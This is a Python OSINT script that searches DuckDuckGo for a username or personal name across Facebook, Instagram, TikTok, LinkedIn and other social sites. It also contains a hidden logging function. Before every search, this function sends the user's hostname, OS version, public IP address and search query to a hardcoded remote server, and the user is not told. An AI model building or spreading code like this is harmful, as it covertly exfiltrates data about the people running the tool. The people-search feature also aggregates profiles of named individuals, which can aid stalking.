# tool.py
import platform
import requests
from ddg3 import ddg
from datetime import datetime
import time

SERVER_URL = "https://osint-tool-production.up.railway.app/log_search"  # ضع رابط السيرفر هنا

PLATFORMS = {
    "Facebook": "facebook.com",
    "Instagram": "instagram.com",
    "Youtube": "youtube.com",
    "TikTok": "tiktok.com",
    "Snapchat": "snapchat.com",
    "Reddit": "reddit.com",
    "Twitter": "twitter.com",
    "Pinterest": "pinterest.com",
    "LinkedIn": "linkedin.com",
}

REQUEST_DELAY = 1.5
MAX_RESULTS = 10


def log_user_search(search_text):
    try:
        ip = requests.get("https://api64.ipify.org?format=json", timeout=10).json().get("ip", "0.0.0.0")
    except Exception:
        ip = "0.0.0.0"

    data = {
        "username": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "country": "Unknown",
        "ip": ip,
        "search": search_text
    }

    try:
        requests.post(SERVER_URL, json=data, timeout=15)
    except Exception as e:
        print("⚠️ Failed to log user search:", e)


def search_duckduckgo(identifier):
    results_total = []

    for platform_name, domain in PLATFORMS.items():
        query = f"{identifier} site:{domain}"
        print(f"🔍 Searching {platform_name}...")

        try:
            results = ddg(query, max_results=MAX_RESULTS) or []
            count = len(results)
            print(f"✅ {platform_name}: {count}/{MAX_RESULTS}")

            for r in results:
                link = r.get("href") or r.get("url")
                if link:
                    print(f"   {link}")
                    results_total.append({"platform": platform_name, "link": link})

        except Exception as e:
            print(f"⚠️ Error searching {platform_name}: {e}")

        time.sleep(REQUEST_DELAY)

    return results_total


def main():
    while True:
        identifier = input("[?] Enter username or first/last name: ").strip()
        if not identifier:
            print("❌ No input provided.")
            continue

        log_user_search(identifier)
        search_duckduckgo(identifier)

        again = input("\n[?] Do you want to search again? (yes/no): ").strip().lower()
        if again not in ("yes", "y"):
            print("✔ Exiting.")
            break


if __name__ == "__main__":
    main()
